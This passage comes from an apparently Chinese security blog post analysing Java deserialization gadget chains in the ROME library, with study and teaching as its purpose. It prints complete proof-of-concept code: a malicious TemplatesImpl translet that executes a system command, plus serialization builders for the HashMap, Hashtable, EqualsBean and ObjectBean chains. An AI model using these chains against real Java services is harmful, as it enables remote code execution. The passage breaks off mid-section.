class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line">        toStringBean.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj,String fieldName,Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>是可以成功弹出计算器的。</p><p>现在就是要找前半部分的构造链了，现在就是要找到一个能够调用toString方法的类并且可控，在ROME中存在着EqualsBean类的beanHashCode方法存在着能够调用toString方法，并且obj可控</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735224481502-bafa30f2-6837-483d-a9de-037c10ecf561.png" alt=""></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735224563537-320aec49-f0cc-4e1e-82b0-af03aa171350.png" alt=""></p><p>所以接下里要找谁调用了beanHashCode方法，可以找打在同类下存在一个hashcode方法调用了该方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735224606109-02507cdd-c449-4e61-a4aa-573abfaee5b7.png" alt=""></p><p>再去找hashcode的调用很容易可以想到hashmap可以调用到hashcode方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735224187972-c460f451-08ca-4c41-9e00-96fa1fffa5f4.png" alt=""></p><p>hashmap的readObject方法中是能够调用到hash方法的然后在看看hash方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735224233726-1346e642-a08b-417c-8b6e-b8fdce1ef430.png" alt=""></p><p>这里key会调用hashcode方法。所以到此整个流程就比较明了了可以直接写POC了</p><h2 id="hashmap-TemplatesImpl利用链">hashmap+TemplatesImpl利用链</h2><p>自己构造的恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Exp</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;open -a Calculator&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里还是要记得不要含有包名要不然编译的时候可能会报错</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735222928820-b115ee34-2ae4-4770-a83f-6b35cd534147.png" alt=""></p><p>放到java目录下就可以了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Rome_EqualsBean</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/ocean/Cybersecurity/Java_project/Rome_stu/src/main/java/Exp.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(equalsBean, <span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Serialize(hashMap);</span></span><br><span class="line">        DeSerialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">DeSerialize</span><span class="params">(String s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(s));</span><br><span class="line">        <span class="keyword">return</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj,String fieldName,Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面几种ROME利用链的后半段较为固定，都是使用<code>TemplatesImpl.getOutputProperties()</code>进行任意类加载，所以这里的其他利用链都是针对前半段入口处进行替换的。</p><h2 id="ObjectBean利用">ObjectBean利用</h2><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735226296723-bc90fdf1-110f-4835-b26f-5d5f729601b9.png" alt=""></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735226313426-67c96871-1009-454c-8897-f66b902fcff8.png" alt=""></p><p>可以看到ObjectBean也存在hashcode方法并且也调用了beanHashcode方法，并且也都可控所以只需要将</p><p>EqualsBean换成ObjectBean即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Remote_ObjectBean</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/ocean/Cybersecurity/Java_project/Rome_stu/src/main/java/Exp.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(objectBean, <span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Serialize(hashMap);</span><br><span class="line">        DeSerialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">DeSerialize</span><span class="params">(String s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(s));</span><br><span class="line">        <span class="keyword">return</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="HashTable利用链">HashTable利用链</h2><p>HashTable利用链只是更换了HashMap入口类而已其他的流程还是不变，看一下HashTable的入口点<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735226700498-21fd1c8b-6468-4ad6-9b11-9c44b4a9c83f.png" alt=""></p><p>可以看到会调用reconstitutionPut方法跟进去看看</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735226743360-c0682c79-5f87-4572-b6fe-3aa8894b1a22.png" alt=""></p><p>可以看到会调用hashcode方法所以后面就很明了了，可以将HashTable替换为HashMap集合EualsBean和ObjectBean进行利用</p><h3 id="HashTbale-ObjectBean">HashTbale+ObjectBean</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Remo_HashTable_ObjectBean</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/ocean/Cybersecurity/Java_project/Rome_stu/src/main/java/Exp.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(objectBean,<span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Serialize(hashtable);</span><br><span class="line">        DeSerialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">DeSerialize</span><span class="params">(String s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(s));</span><br><span class="line">        <span class="keyword">return</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="HashTbale-EqualsBean">HashTbale+EqualsBean</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Remo_HashTable_EqualsBean</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/ocean/Cybersecurity/Java_project/Rome_stu/src/main/java/Exp.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(equalsBean,<span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Serialize(hashtable);</span><br><span class="line">        DeSerialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">DeSerialize</span><span class="params">(String s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(s));</span><br><span class="line">        <span class="keyword">return</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="BadAttributeValueExpException利用链">BadAttributeValueExpException利用链</h2><p>这里其实利用的是BadAttributeValueExpException可以调用任意类的toString方法，我们在cc5链、fastjson的时候都分析过</p><p><img 